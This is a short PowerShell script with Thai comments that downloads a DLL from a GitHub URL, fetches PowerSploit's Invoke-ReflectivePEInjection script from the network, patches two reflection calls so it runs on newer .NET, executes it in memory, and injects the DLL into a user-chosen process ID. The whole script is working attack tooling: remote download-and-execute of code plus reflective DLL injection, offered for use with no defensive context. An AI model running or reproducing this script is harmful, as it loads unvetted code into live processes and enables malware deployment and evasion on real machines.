# inject.ps1 - เวอร์ชันที่รันอัตโนมัติ
param([string]$DllUrl, [int]$Pid)

if (-not $DllUrl) { 
    $DllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1_x64.dll"  # เปลี่ยนเป็น URL DLL ของคุณ
}

$dllBytes = (iwr -UseBasicParsing $DllUrl).Content
$ps1Content = (iwr -UseBasicParsing "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1").Content
$ps1Content = $ps1Content -replace '\$GetProcAddress\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetProcAddress''\)', '$GetProcAddress = $UnsafeNativeMethods.GetMethod(''GetProcAddress'', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))'
$ps1Content = $ps1Content -replace '\$GetModuleHandle\s*=\s*\$UnsafeNativeMethods\.GetMethod\(''GetModuleHandle''\)', '$GetModuleHandle = $UnsafeNativeMethods.GetMethod(''GetModuleHandle'', [Type[]]@([String]))'
. ([ScriptBlock]::Create($ps1Content))

if (-not $Pid) {
    Get-Process | Select Id, ProcessName | Format-Table -AutoSize
    $Pid = Read-Host "Enter PID"
}
Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId $Pid
